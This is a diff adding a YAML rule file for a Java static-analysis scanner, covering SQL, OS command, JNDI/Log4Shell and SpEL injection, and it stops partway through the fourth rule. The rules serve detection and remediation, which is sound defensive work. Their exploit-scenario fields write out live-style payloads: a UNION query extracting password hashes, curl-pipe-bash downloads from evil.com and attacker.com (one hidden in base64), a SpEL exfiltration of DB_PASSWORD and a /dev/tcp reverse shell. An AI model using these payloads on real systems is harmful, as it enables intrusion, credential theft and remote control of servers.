@@ -1,0 +1,2292 @@
+rules:
+- rule_id: JAVA-INJ-001
+  title: SQL Injection via String Concatenation in Statement
+  description: 'Detects JDBC Statement.execute or createStatement with concatenated user input instead of PreparedStatement.
+    This includes detection of string-built queries passed to Statement objects, StringBuilder-based query assembly, and indirect
+    taint flows from HTTP request parameters into SQL execution sinks.
+
+    '
+  language: java
+  category: injection
+  severity: Critical
+  confidence: 0.94
+  cwe: CWE-89
+  owasp: A03:2021-Injection
+  tags:
+  - sql-injection
+  - jdbc
+  - statement
+  - taint-flow
+  - data-layer
+  patterns:
+  - type: regex
+    pattern: (?:createStatement|Statement)\s*\([^)]*\)\s*\.(?:execute|executeQuery|executeUpdate)\s*\(\s*['"](?:SELECT|INSERT|UPDATE|DELETE)\b[^'"]*["']\s*\+\s*\w+
+    description: Statement.execute with inline SQL concatenation
+  - type: regex
+    pattern: \.(?:executeQuery|executeUpdate|execute)\s*\(\s*['"](?:SELECT|INSERT|UPDATE|DELETE)\b[^'"]*["']\s*\+\s*(?:request|param|input|user|arg)
+    description: execute with taint-named variable concatenation
+  - type: regex
+    pattern: String\s+\w*(?:sql|query|stmt)\w*\s*=\s*['"](?:SELECT|INSERT|UPDATE|DELETE)\b[^'"]*["']\s*\+\s*(?:request|param|input|user)
+    description: SQL string variable built via concatenation from request sources
+  - type: regex
+    pattern: (?:createStatement|Statement)\s*\([^)]*\)\s*\.(?:execute\w*)\s*\(\s*\w*(?:sql|query|stmt)\w*\s*\+
+    description: Statement execution with variable-based SQL concatenation
+  - type: regex
+    pattern: \.(?:executeQuery|executeUpdate)\s*\(\s*"[^"]*"\s*\+\s*\w+\.get(?:Parameter|Header|Attribute)\s*\(
+    description: Direct getParameter/getHeader concatenation into execute call
+  - type: regex
+    pattern: StringBuilder\s+\w*(?:sql|query|stmt)\w*\s*=.*\.append\s*\(\s*(?:request|param|input|user|arg)
+    description: StringBuilder-based SQL query with tainted append
+  - type: regex
+    pattern: String\.format\s*\(\s*['"](?:SELECT|INSERT|UPDATE|DELETE)\b[^'"]*%s[^'"]*["']\s*,\s*(?:request|param|input|user)
+    description: String.format used to inject user input into SQL template
+  - type: regex
+    pattern: (?:stmt|statement|st)\s*\.(?:execute|executeQuery|executeUpdate)\s*\(\s*\w+\s*\+\s*\w+\s*\+\s*\w+
+    description: Multi-part concatenation passed to statement execution
+  - type: regex
+    pattern: (?:connection|conn|con)\s*\.createStatement\s*\(\s*\)[\s\S]{0,120}\.execute\w*\s*\(\s*[^)]*\+
+    description: createStatement followed by execute with concatenation within nearby lines
+  - type: regex
+    pattern: MessageFormat\.format\s*\(\s*['"](?:SELECT|INSERT|UPDATE|DELETE)\b[^'"]*\{0\}[^'"]*["']\s*,\s*(?:request|param|input|user)
+    description: MessageFormat used to interpolate user input into SQL
+  anti_patterns:
+  - PreparedStatement
+  - prepareStatement
+  - setString
+  - setInt
+  - setObject
+  - NamedParameterJdbcTemplate
+  - JpaRepository
+  - CrudRepository
+  - PagingAndSortingRepository
+  - JdbcTemplate.query
+  - JdbcTemplate.update
+  - JdbcTemplate.queryForObject
+  - JdbcTemplate.queryForList
+  - MapSqlParameterSource
+  - BeanPropertySqlParameterSource
+  - SqlParameterSource
+  - CriteriaBuilder
+  - CriteriaQuery
+  - Specification
+  - QueryDSL
+  - JPAQueryFactory
+  - '@Query'
+  - mybatis
+  - '#{param}'
+  - SqlSessionFactory
+  - MappedStatement
+  - TypedQuery
+  - StoredProcedureQuery
+  - session.createQuery.*setParameter
+  - Hibernate.createSQLQuery.*setParameter
+  - EntityManager.createNamedQuery
+  - spring.data.jpa
+  context_awareness:
+    surrounding_context_patterns:
+    - import java.sql.Statement
+    - import java.sql.Connection
+    - import java.sql.DriverManager
+    - import javax.sql.DataSource
+    - implements.*Repository
+    - extends.*DaoImpl
+    - '@Repository'
+    - '@Transactional'
+    taint_source_indicators:
+    - request.getParameter
+    - request.getHeader
+    - request.getAttribute
+    - request.getQueryString
+    - request.getCookies
+    - '@RequestParam'
+    - '@PathVariable'
+    - '@RequestBody'
+    - '@RequestHeader'
+    - HttpServletRequest
+    - ServletRequest
+    - WebRequest.getParameter
+    - MultipartFile
+    taint_sink_indicators:
+    - Statement.execute
+    - Statement.executeQuery
+    - Statement.executeUpdate
+    - Statement.executeBatch
+    - Statement.addBatch
+    - Connection.createStatement
+    - Connection.prepareCall
+    sanitization_patterns:
+    - PreparedStatement
+    - prepareStatement
+    - setString
+    - setInt
+    - setLong
+    - setObject
+    - setFloat
+    - setDouble
+    - setDate
+    - setTimestamp
+    - setBoolean
+    - StringEscapeUtils.escapeSql
+    - ESAPI.encoder().encodeForSQL
+    - SQLEncoder
+    - Codec.encode
+    - Pattern.matches.*[a-zA-Z0-9]
+    - InputValidator
+    - Validator.validate
+  severity_scoring:
+    severity_weight: 10
+    risk_score_formula_hint: severity_weight * confidence * (1.0 - sanitization_coverage)
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'An attacker discovers a user search endpoint at /api/users?name=. The backend constructs a SQL query
+      using string concatenation: "SELECT * FROM users WHERE name = ''" + request.getParameter("name") + "''". The attacker
+      submits name='' OR ''1''=''1'' -- which causes the query to return all user records. Escalating further, the attacker
+      uses UNION SELECT to extract password hashes from the credentials table and then leverages database-specific functions
+      to read server files or execute system commands via xp_cmdshell or LOAD_FILE.
+
+      '
+    example_payload: ''' UNION SELECT username, password_hash, email, credit_card FROM users--'
+    attacker_objective: Full database exfiltration, authentication bypass, privilege escalation to DBA, potential remote code
+      execution via database stored procedures
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  impact: 'SQL injection via JDBC Statement allows full database compromise including
+
+    data exfiltration, record manipulation, schema modification, and in some
+
+    cases remote code execution through database stored procedures.
+
+    '
+  remediation: "**Immediate Fix — Use PreparedStatement with parameterized queries:**\n  PreparedStatement ps = conn.prepareStatement(\"\
+    SELECT * FROM users WHERE id = ?\");\n  ps.setString(1, userId);\n  ResultSet rs = ps.executeQuery();\n\n**Spring Boot\
+    \ / Spring JDBC:**\n  @Autowired JdbcTemplate jdbcTemplate;\n  String sql = \"SELECT * FROM users WHERE name = ?\";\n\
+    \  List<User> users = jdbcTemplate.query(sql, new Object[]{name}, new UserRowMapper());\n\n  // Or with NamedParameterJdbcTemplate:\n\
+    \  MapSqlParameterSource params = new MapSqlParameterSource();\n  params.addValue(\"name\", name);\n  namedTemplate.query(\"\
+    SELECT * FROM users WHERE name = :name\", params, mapper);\n\n**Jakarta EE / JPA (Hibernate):**\n  TypedQuery<User> q\
+    \ = em.createQuery(\"SELECT u FROM User u WHERE u.name = :name\", User.class);\n  q.setParameter(\"name\", userInput);\n\
+    \  List<User> results = q.getResultList();\n\n  // Or use Spring Data JPA repositories:\n  @Query(\"SELECT u FROM User\
+    \ u WHERE u.name = :name\")\n  List<User> findByName(@Param(\"name\") String name);\n\n**Hibernate Criteria API:**\n \
+    \ CriteriaBuilder cb = session.getCriteriaBuilder();\n  CriteriaQuery<User> cq = cb.createQuery(User.class);\n  Root<User>\
+    \ root = cq.from(User.class);\n  cq.select(root).where(cb.equal(root.get(\"name\"), userInput));\n  List<User> results\
+    \ = session.createQuery(cq).getResultList();\n\n**MyBatis — Use #{} (never ${}):**\n  <!-- Safe: parameterized -->\n \
+    \ <select id=\"findUser\" resultType=\"User\">\n    SELECT * FROM users WHERE name = #{name}\n  </select>\n\n  <!-- UNSAFE:\
+    \ raw interpolation -->\n  <select id=\"findUser\" resultType=\"User\">\n    SELECT * FROM users WHERE name = '${name}'\n\
+    \  </select>\n\n**Additional hardening:**\n  - Enable SQL logging in development to audit generated queries\n  - Use a\
+    \ Web Application Firewall (WAF) as defense-in-depth\n  - Apply principle of least privilege to database accounts\n  -\
+    \ Conduct regular static analysis scans with tools like SpotBugs + Find Security Bugs\n"
+  references:
+  - https://owasp.org/Top10/A03_2021-Injection/
+  - https://cwe.mitre.org/data/definitions/89.html
+  - https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
+  - https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html
+  metadata:
+    rule_version: 2.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: flow-aware
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - JAVA-INJ-005
+    - JAVA-INJ-003
+    - JAVA-AUTH-001
+    - JAVA-CRYPTO-002
+  detection_layer: 1
+- rule_id: JAVA-INJ-002
+  title: Command Injection via Runtime.exec or ProcessBuilder
+  description: 'Detects Runtime.exec() or ProcessBuilder.command() with user-controlled input enabling OS command injection.
+    Covers direct invocations, shell wrappers (cmd.exe /c, /bin/sh -c), indirect taint through variable assignment, and commons-exec
+    usage with unsanitized arguments.
+
+    '
+  language: java
+  category: injection
+  severity: Critical
+  confidence: 0.92
+  cwe: CWE-78
+  owasp: A03:2021-Injection
+  tags:
+  - command-injection
+  - runtime-exec
+  - process-builder
+  - rce
+  - os-command
+  patterns:
+  - type: regex
+    pattern: Runtime\.getRuntime\s*\(\s*\)\.exec\s*\(\s*(?:request|param|input|user|arg|cmd|command)\b
+    description: Runtime.exec with tainted variable name directly
+  - type: regex
+    pattern: Runtime\.getRuntime\s*\(\s*\)\.exec\s*\(\s*['"](?:[^'"]*["']\s*\+\s*(?:request|param|input|user))
+    description: Runtime.exec with string concatenation from request sources
+  - type: regex
+    pattern: new\s+ProcessBuilder\s*\(\s*(?:Arrays\.asList\s*\()?[^)]*(?:request|param|input|user|arg)\b
+    description: ProcessBuilder constructor with tainted argument
+  - type: regex
+    pattern: ProcessBuilder\s*\([^)]*\)\.command\s*\([^)]*(?:request|param|input|user)\b
+    description: ProcessBuilder.command with tainted argument
+  - type: regex
+    pattern: \.exec\s*\(\s*(?:new\s+String\s*\[\]\s*\{)?[^)]*(?:getParameter|getHeader|getAttribute)\s*\(
+    description: exec with direct HttpServletRequest getter
+  - type: regex
+    pattern: Runtime\.getRuntime\s*\(\s*\)\.exec\s*\(\s*(?:new\s+String\s*\[\]\s*\{)?\s*"(?:/bin/(?:sh|bash)|cmd\.exe|cmd|powershell)[^"]*"\s*,\s*[^)]*(?:request|param|input|user)
+    description: Shell invocation (sh/bash/cmd) with tainted arguments
+  - type: regex
+    pattern: (?:pb|processBuilder|builder)\s*\.command\s*\(\s*(?:Arrays\.asList|List\.of)\s*\([^)]*(?:request|param|input|user|arg)\b
+    description: ProcessBuilder.command via List.of/Arrays.asList with tainted input
+  - type: regex
+    pattern: new\s+CommandLine\s*\(\s*[^)]*(?:request|param|input|user)\b
+    description: Apache Commons Exec CommandLine with tainted input
+  - type: regex
+    pattern: DefaultExecutor\s*\(\s*\)\s*\.execute\s*\(\s*(?:cmd|command|commandLine)\b
+    description: Apache Commons Exec DefaultExecutor with variable command
+  - type: regex
+    pattern: (?:String|var)\s+\w*(?:cmd|command|exec|proc)\w*\s*=\s*['"][^'"]*["']\s*\+\s*(?:request|param|input|user)
+    description: Command string variable built via concatenation
+  - type: regex
+    pattern: ProcessBuilder\s*\([^)]*\)\.start\s*\(
+    description: ProcessBuilder.start() — flag for review when nearby tainted input
+  - type: regex
+    pattern: ScriptEngine\s*.*\.eval\s*\(\s*(?:request|param|input|user|data|arg)\b
+    description: ScriptEngine.eval with tainted input enabling code execution
+  anti_patterns:
+  - sanitize
+  - allowList
+  - whitelist
+  - Pattern.matches
+  - StringUtils.isAlphanumeric
+  - StringUtils.isAlpha
+  - StringUtils.isNumeric
+  - Validator.validate
+  - InputValidator
+  - SecurityManager
+  - ProcessBuilder.redirectErrorStream
+  - commons.text.StringEscapeUtils
+  - ESAPI.encoder
+  - Encoder.encodeForOS
+  - CommandLine.addArgument.*false
+  - Collections.unmodifiableList
+  - enum
+  - switch.*case
+  - EnumSet.contains
+  - hardcodedCommands.contains
+  - ALLOWED_COMMANDS
+  context_awareness:
+    surrounding_context_patterns:
+    - import java.lang.Runtime
+    - import java.lang.ProcessBuilder
+    - import java.lang.Process
+    - import org.apache.commons.exec
+    - import javax.script.ScriptEngine
+    - '@Controller'
+    - '@RestController'
+    - '@Service'
+    - implements CommandExecutor
+    taint_source_indicators:
+    - request.getParameter
+    - request.getHeader
+    - '@RequestParam'
+    - '@PathVariable'
+    - '@RequestBody'
+    - args[0]
+    - System.getProperty
+    - System.getenv
+    - Scanner.nextLine
+    - BufferedReader.readLine
+    - MultipartFile.getOriginalFilename
+    - HttpServletRequest
+    taint_sink_indicators:
+    - Runtime.getRuntime().exec
+    - ProcessBuilder.start
+    - ProcessBuilder.command
+    - DefaultExecutor.execute
+    - ScriptEngine.eval
+    - GroovyShell.evaluate
+    - Interpreter.eval
+    sanitization_patterns:
+    - Pattern.matches("[a-zA-Z0-9]+"
+    - StringUtils.isAlphanumeric
+    - allowList.contains
+    - Arrays.asList(ALLOWED).contains
+    - EnumSet.contains
+    - org.owasp.encoder
+    - ESAPI.encoder().encodeForOS
+    - Validator.isValid
+  severity_scoring:
+    severity_weight: 10
+    risk_score_formula_hint: severity_weight * confidence * (1.0 - sanitization_coverage) * environment_exposure
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A file-conversion microservice exposes an endpoint /api/convert?filename= that uses Runtime.exec() to
+      invoke an external tool: Runtime.getRuntime().exec("convert " + request.getParameter("filename") + " output.pdf"). An
+      attacker submits filename=;curl+attacker.com/shell.sh|bash which is concatenated into the command string. The shell
+      interprets the semicolon as a command separator and executes the attacker''s reverse-shell script. The attacker gains
+      interactive shell access to the server with the privileges of the Java process.
+
+      '
+    example_payload: test.png; curl http://evil.com/rev.sh | /bin/bash
+    attacker_objective: Remote code execution on the application server, establishing persistence via reverse shell, lateral
+      movement within internal network
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: high
+    sanitization_absence: high
+  impact: 'Arbitrary OS command execution on the server, enabling full system compromise,
+
+    data exfiltration, privilege escalation, and lateral movement.
+
+    '
+  remediation: "**Immediate Fix — Avoid shell invocation entirely:**\n  // UNSAFE:\n  Runtime.getRuntime().exec(\"convert\
+    \ \" + filename + \" output.pdf\");\n\n  // SAFE: pass arguments as array (no shell interpretation):\n  ProcessBuilder\
+    \ pb = new ProcessBuilder(\"convert\", sanitizedFilename, \"output.pdf\");\n  pb.redirectErrorStream(true);\n  Process\
+    \ p = pb.start();\n\n**Spring Boot:**\n  // Use Java libraries instead of shelling out:\n  @Service\n  public class FileConversionService\
+    \ {\n      public byte[] convert(MultipartFile file) {\n          // Use Apache PDFBox, iText, or similar Java library\n\
+    \          // Never pass user filenames to OS commands\n          String safeName = UUID.randomUUID().toString() + \"\
+    .pdf\";\n          // ... pure-Java conversion logic\n      }\n  }\n\n**Jakarta EE:**\n  // Validate against strict allowlist:\n\
+    \  private static final Set<String> ALLOWED = Set.of(\"png\", \"jpg\", \"gif\");\n  public void processFile(String format)\
+    \ {\n      if (!ALLOWED.contains(format.toLowerCase())) {\n          throw new IllegalArgumentException(\"Unsupported\
+    \ format\");\n      }\n      // Only then use the validated format\n  }\n\n**Apache Commons Exec (if shell-out is unavoidable):**\n\
+    \  CommandLine cmdLine = new CommandLine(\"convert\");\n  cmdLine.addArgument(sanitizedFilename, false); // false = no\
+    \ quoting substitution\n  cmdLine.addArgument(\"output.pdf\", false);\n  DefaultExecutor executor = new DefaultExecutor();\n\
+    \  executor.setWatchdog(new ExecuteWatchdog(30000));\n  executor.execute(cmdLine);\n\n**Additional hardening:**\n  - Run\
+    \ the JVM with a SecurityManager restricting exec permissions\n  - Use containerized sandboxes for external tool invocations\n\
+    \  - Apply network egress filtering to prevent reverse shell callbacks\n  - Log all command executions with arguments\
+    \ for audit\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/78.html
+  - https://owasp.org/Top10/A03_2021-Injection/
+  - https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
+  metadata:
+    rule_version: 2.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: flow-aware
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - JAVA-INJ-001
+    - JAVA-INJ-003
+    - JAVA-INJ-004
+    - JAVA-PATH-001
+  detection_layer: 1
+- rule_id: JAVA-INJ-003
+  title: JNDI Injection (Log4Shell Pattern)
+  description: 'Detects potential JNDI lookup injection through user-controlled input passed to logging frameworks or JNDI
+    context lookups. Covers Log4j2 message lookup exploitation (CVE-2021-44228), direct InitialContext.lookup with tainted
+    strings, JMS destination lookups, and DataSource JNDI references with user-influenced names.
+
+    '
+  language: java
+  category: injection
+  severity: Critical
+  confidence: 0.88
+  cwe: CWE-917
+  owasp: A03:2021-Injection
+  tags:
+  - jndi-injection
+  - log4shell
+  - rce
+  - deserialization
+  - cve-2021-44228
+  - logging
+  patterns:
+  - type: regex
+    pattern: (?:logger|log|LOG)\s*\.(?:info|warn|error|debug|trace|fatal)\s*\(\s*(?:request|param|input|user|header|cookie)\b
+    description: Logger method called with tainted variable directly
+  - type: regex
+    pattern: InitialContext\s*\(\s*\)\s*\.lookup\s*\(\s*(?:request|param|input|user|data)\b
+    description: InitialContext.lookup with tainted argument
+  - type: regex
+    pattern: (?:ctx|context|ic|initialContext)\s*\.lookup\s*\(\s*(?:request|param|input|user|data|arg)\b
+    description: Context.lookup with tainted variable name
+  - type: regex
+    pattern: (?:logger|log)\s*\.\w+\s*\(\s*['"][^'"]*["']\s*\+\s*(?:request|param|input|user)\b
+    description: Logger with concatenated user input
+  - type: regex
+    pattern: 'JndiLookup|JMSAppender|SocketServer|jndi:'
+    description: Direct JNDI lookup class or protocol reference
+  - type: regex
+    pattern: (?:logger|log|LOG)\s*\.(?:info|warn|error|debug|trace|fatal)\s*\(\s*[^)]*request\.get(?:Parameter|Header|QueryString|RemoteAddr)\s*\(
+    description: Logger with direct request getter invocation
+  - type: regex
+    pattern: (?:logger|log|LOG)\s*\.(?:info|warn|error|debug|trace|fatal)\s*\(\s*String\.format\s*\([^)]*(?:request|param|input|user)\b
+    description: Logger with String.format containing tainted input
+  - type: regex
+    pattern: (?:ctx|context|initialContext|ic)\s*\.lookup\s*\(\s*['"](?:ldap|rmi|dns|iiop|corba)://[^'"]*["']
+    description: JNDI lookup with remote protocol URI
+  - type: regex
+    pattern: (?:ctx|context)\s*\.lookup\s*\(\s*['"][^'"]*["']\s*\+\s*\w+
+    description: JNDI lookup with concatenated dynamic component
+  - type: regex
+    pattern: NamingManager\.getObjectInstance|DirectoryManager\.getObjectInstance
+    description: NamingManager/DirectoryManager object resolution — potential deserialization point
+  - type: regex
+    pattern: new\s+InitialDirContext\s*\(\s*[^)]*(?:request|param|input|user)\b
+    description: InitialDirContext with tainted environment properties
+  - type: regex
+    pattern: JMSContext\s*.*\.createQueue\s*\(\s*(?:request|param|input|user|data)\b
+    description: JMS queue creation with tainted destination name
+  anti_patterns:
+  - log4j2.formatMsgNoLookups=true
+  - LOG4J_FORMAT_MSG_NO_LOOKUPS
+  - PatternLayout.disableAnsi
+  - '%m{nolookups}'
+  - log4j-2.17
+  - log4j-2.18
+  - log4j-2.19
+  - log4j-2.20
+  - log4j-2.21
+  - log4j-2.22
+  - log4j-2.23
+  - log4j-2.24
+  - JndiLookup.class
+  - zip -q -d.*JndiLookup
+  - SANITIZE
+  - encode
+  - stripJndi
+  - JNDI_DENY_LIST
+  - allowedProtocols
+  - allowedHosts
+  - com.sun.jndi.ldap.object.trustURLCodebase=false
+  - com.sun.jndi.rmi.object.trustURLCodebase=false
+  context_awareness:
+    surrounding_context_patterns:
+    - import org.apache.logging.log4j
+    - import org.slf4j
+    - import java.util.logging
+    - import javax.naming
+    - import javax.naming.InitialContext
+    - import javax.naming.directory
+    - LoggerFactory.getLogger
+    - LogManager.getLogger
+    - '@Slf4j'
+    - '@Log4j2'
+    taint_source_indicators:
+    - request.getParameter
+    - request.getHeader
+    - request.getQueryString
+    - request.getRemoteAddr
+    - request.getCookies
+    - '@RequestParam'
+    - '@RequestHeader'
+    - '@PathVariable'
+    - '@CookieValue'
+    - HttpServletRequest
+    - X-Forwarded-For
+    - User-Agent
+    - Referer
+    taint_sink_indicators:
+    - Logger.info
+    - Logger.warn
+    - Logger.error
+    - Logger.debug
+    - Logger.trace
+    - Logger.fatal
+    - InitialContext.lookup
+    - Context.lookup
+    - DirContext.search
+    - JndiTemplate.lookup
+    sanitization_patterns:
+    - log4j2.formatMsgNoLookups
+    - '%m{nolookups}'
+    - Encode.forJava
+    - StringEscapeUtils.escapeJava
+    - ESAPI.encoder().encodeForLDAP
+    - stripXSS
+    - HtmlUtils.htmlEscape
+    - Pattern.matches.*[a-zA-Z0-9]
+  severity_scoring:
+    severity_weight: 10
+    risk_score_formula_hint: severity_weight * confidence * log4j_version_vulnerability_factor * network_exposure
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A Spring Boot application running Log4j2 < 2.17.0 logs HTTP request headers for debugging. An attacker
+      sends a crafted request with the header X-Api-Token: ${jndi:ldap://attacker.com:1389/Exploit}. When the application
+      logs this header value, Log4j2 performs a JNDI lookup to the attacker-controlled LDAP server. The LDAP server responds
+      with a reference to a remote Java class file. The JVM downloads and instantiates this class, executing the attacker''s
+      payload — typically a reverse shell or crypto-miner — with the full privileges of the Java process.
+
+      '
+    example_payload: ${jndi:ldap://attacker.com:1389/TomcatBypass/Command/Base64/Y3VybCBodHRwOi8vYXR0YWNrZXIuY29tL3NoZWxsLnNofGJhc2g=}
+    attacker_objective: Remote code execution via JNDI deserialization, establishing C2 channel, lateral movement, cryptomining,
+      data exfiltration
+  confidence_factors:
+    pattern_strength: high
+    context_match: high
+    proximity_to_user_input: medium
+    sanitization_absence: high
+  impact: 'JNDI injection (CVE-2021-44228 — Log4Shell) enables remote code execution
+
+    by triggering JNDI lookups to attacker-controlled LDAP/RMI servers, which
+
+    serve malicious Java classes for deserialization.
+
+    '
+  remediation: "**Immediate Fix — Upgrade Log4j:**\n  - Upgrade Log4j2 to 2.17.1+ (for Java 8) or 2.12.4+ (for Java 7)\n \
+    \ - Use the latest available version for ongoing protection\n\n**Spring Boot:**\n  // In application.properties or application.yml:\n\
+    \  logging.level.root=INFO\n  // Override Log4j2 version in pom.xml:\n  <properties>\n    <log4j2.version>2.23.1</log4j2.version>\n\
+    \  </properties>\n\n  // Use parameterized logging — NEVER concatenate:\n  // UNSAFE:\n  log.info(\"User login: \" + request.getHeader(\"\
+    X-User\"));\n  // SAFE:\n  log.info(\"User login: {}\", sanitize(request.getHeader(\"X-User\")));\n\n**Jakarta EE:**\n\
+    \  // Validate JNDI names against allowlist:\n  private static final Set<String> ALLOWED_JNDI = Set.of(\n      \"java:comp/env/jdbc/myDB\"\
+    ,\n      \"java:comp/env/mail/Session\"\n  );\n  public Object safeLookup(String name) throws NamingException {\n    \
+    \  if (!ALLOWED_JNDI.contains(name)) {\n          throw new SecurityException(\"JNDI name not in allowlist\");\n     \
+    \ }\n      return new InitialContext().lookup(name);\n  }\n\n**Hibernate / JPA:**\n  // Ensure DataSource JNDI names are\
+    \ hardcoded in configuration:\n  // persistence.xml:\n  <jta-data-source>java:comp/env/jdbc/myDB</jta-data-source>\n \
+    \ // Never derive JNDI names from user input\n\n**MyBatis:**\n  // In mybatis-config.xml, use hardcoded environment references:\n\
+    \  <dataSource type=\"JNDI\">\n    <property name=\"data_source\" value=\"java:comp/env/jdbc/myDB\"/>\n  </dataSource>\n\
+    \n**Network-level hardening:**\n  - Block outbound LDAP (389, 636, 1389), RMI (1099), and DNS to untrusted hosts\n  -\
+    \ Set JVM flags: -Dcom.sun.jndi.ldap.object.trustURLCodebase=false\n  - Set JVM flags: -Dcom.sun.jndi.rmi.object.trustURLCodebase=false\n\
+    \  - Remove JndiLookup class from log4j-core JAR as defense-in-depth\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/917.html
+  - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+  - https://logging.apache.org/log4j/2.x/security.html
+  - https://www.lunasec.io/docs/blog/log4j-zero-day/
+  metadata:
+    rule_version: 2.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: hardened
+    detection_complexity: contextual
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - JAVA-INJ-001
+    - JAVA-INJ-004
+    - JAVA-DESER-001
+    - JAVA-LOG-001
+  detection_layer: 1
+- rule_id: JAVA-INJ-004
+  title: Expression Language Injection (SpEL/EL)
+  description: 'Detects Spring Expression Language (SpEL) or Jakarta Expression Language (EL) evaluation with user-controlled
+    input. Covers SpelExpressionParser, StandardEvaluationContext, @Value annotations with tainted input, Thymeleaf expression
+    injection, and JSP EL injection via dynamic attribute construction.
+
+    '
+  language: java
+  category: injection
+  severity: Critical
+  confidence: 0.87
+  cwe: CWE-917
+  owasp: A03:2021-Injection
+  tags:
+  - expression-injection
+  - spel
+  - spring
+  - rce
+  - el-injection
+  - thymeleaf
+  patterns:
+  - type: regex
+    pattern: SpelExpressionParser\s*\(\s*\)\s*\.parseExpression\s*\(\s*(?:request|param|input|user|data)\b
+    description: SpelExpressionParser.parseExpression with tainted input
+  - type: regex
+    pattern: (?:parser|expressionParser)\s*\.parseExpression\s*\(\s*(?:request|param|input|user|data|arg)\b
+    description: Expression parser with tainted variable name
+  - type: regex
+    pattern: '@Value\s*\(\s*["'']#\{[^}]*(?:request|param|input|user)\b'
+    description: '@Value annotation with tainted SpEL expression'
+  - type: regex
+    pattern: ExpressionParser\s*\w*\s*=\s*new\s+SpelExpressionParser[^;]*\.parseExpression\s*\(\s*\w*(?:input|param|user)
+    description: SpelExpressionParser instantiation with tainted parse call
+  - type: regex
+    pattern: \.parseExpression\s*\(\s*(?:request|param|input|user|data|arg|body|payload|expr|expression)\b
+    description: Generic parseExpression call with suspicious variable names
+  - type: regex
+    pattern: StandardEvaluationContext\s*\(\s*\)[\s\S]{0,200}\.parseExpression\s*\(\s*(?:request|param|input|user)
+    description: StandardEvaluationContext followed by parseExpression with tainted input
+  - type: regex
+    pattern: Expression\s+\w+\s*=\s*\w+\.parseExpression\s*\(\s*(?:request|param|input|user|data)
+    description: Expression variable assigned from parseExpression with tainted input
+  - type: regex
+    pattern: (?:expression|expr)\s*\.getValue\s*\(\s*(?:new\s+)?StandardEvaluationContext
+    description: Expression.getValue with StandardEvaluationContext (unsafe context)
+  - type: regex
+    pattern: ExpressionFactory\s*\.newInstance\s*\(\s*\)[\s\S]{0,120}\.createValueExpression\s*\([^)]*(?:request|param|input|user)
+    description: Jakarta EL ExpressionFactory with tainted value expression
+  - type: regex
+    pattern: Thymeleaf.*\$\{[^}]*(?:request|param|input|user)\b
+    description: Thymeleaf template expression with tainted input
+  - type: regex
+    pattern: (?:model|modelMap|mav)\s*\.(?:addAttribute|put)\s*\(\s*[^,]+,\s*[^)]*\.parseExpression
+    description: Parsed expression result added to Spring model
+  - type: regex
+    pattern: new\s+TemplateParserContext\s*\(\s*\)[\s\S]{0,150}\.parseExpression\s*\(\s*(?:request|param|input|user)
+    description: TemplateParserContext with tainted input
+  anti_patterns:
+  - SimpleEvaluationContext
+  - StandardEvaluationContext().setRootObject
+  - allowlist
+  - SimpleEvaluationContext.forReadOnlyDataBinding
+  - SimpleEvaluationContext.forPropertyAccessors
+  - DataBindingMethodResolver
+  - ReflectiveMethodResolver
+  - EXPRESSION_ALLOWLIST
+  - ALLOWED_EXPRESSIONS
+  - Pattern.matches
+  - sanitizeExpression
+  - validateExpression
+  - SecurityExpressionHandler
+  - PreInvocationAuthorizationAdvice
+  - spring.security
+  - hasRole
+  - hasAuthority
+  - isAuthenticated
+  - static final String.*=.*#\{
+  context_awareness:
+    surrounding_context_patterns:
+    - import org.springframework.expression
+    - import org.springframework.expression.spel
+    - import org.springframework.expression.spel.standard
+    - import javax.el
+    - import jakarta.el
+    - import org.thymeleaf
+    - SpelExpressionParser
+    - ExpressionParser
+    - StandardEvaluationContext
+    - '@Controller'
+    - '@RestController'
+    taint_source_indicators:
+    - request.getParameter
+    - '@RequestParam'
+    - '@PathVariable'
+    - '@RequestBody'
+    - '@RequestHeader'
+    - HttpServletRequest
+    - WebRequest
+    - MultiValueMap
+    - '@ModelAttribute'
+    - BindingResult
+    taint_sink_indicators:
+    - ExpressionParser.parseExpression
+    - SpelExpressionParser.parseExpression
+    - Expression.getValue
+    - Expression.setValue
+    - ExpressionFactory.createValueExpression
+    - ELProcessor.eval
+    - ELProcessor.setValue
+    - ELProcessor.getValue
+    - TemplateEngine.process
+    sanitization_patterns:
+    - SimpleEvaluationContext
+    - forReadOnlyDataBinding
+    - DataBindingMethodResolver
+    - allowList.contains
+    - Pattern.matches
+    - ALLOWED_EXPRESSIONS.contains
+    - sanitizeExpression
+  severity_scoring:
+    severity_weight: 9
+    risk_score_formula_hint: 'severity_weight * confidence * (1.0 - (uses_simple_context ? 0.7 : 0.0))'
+    exploitability_score: High
+  exploit_scenario:
+    attack_example: 'A Spring MVC application provides a calculator feature at /api/calculate?expr= that evaluates user expressions
+      using SpEL with StandardEvaluationContext. The developer intends simple math like "2 + 3" but an attacker submits: T(java.lang.Runtime).getRuntime().exec(''curl
+      attacker.com/exfil?data=''+T(java.lang.System).getenv(''DB_PASSWORD'')) This SpEL expression accesses the Runtime class,
+      executes an OS command, and exfiltrates the database password from the environment variables to the attacker''s server.
+
+      '
+    example_payload: T(java.lang.Runtime).getRuntime().exec(new String[]{'bash','-c','bash -i >& /dev/tcp/attacker.com/4444
+      0>&1'})
